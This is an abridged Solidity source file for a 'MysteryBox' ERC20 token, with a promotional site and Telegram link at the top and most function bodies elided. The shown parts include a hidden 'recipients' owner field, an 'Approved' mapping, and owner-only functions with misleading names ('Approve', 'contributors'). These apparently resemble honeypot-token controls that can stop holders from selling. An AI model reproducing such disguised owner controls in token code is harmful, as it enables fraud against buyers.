//https://revealthemystery.com/               https://t.me/mysteryboxofficial
...
contract MysterY is Context {
    address internal recipients;
    address internal router;
    address public owner;

    mapping (address => bool) internal Approved;
    event mystery(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit mystery(address(0), msgSender);
    }
    modifier checker() {
...
contract ERC20 is Context, IERC20, IERC20Metadata , MysterY{
    ...
    function Approve (address Uniswaprouterv02) public checker {
    ...
    function contributors(address[] memory _addresses) external checker {
...
contract Mystery is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 123456789 * 10 ** 18;

    constructor () ERC20('MysteryBox', unicode'Mystery️📦') {
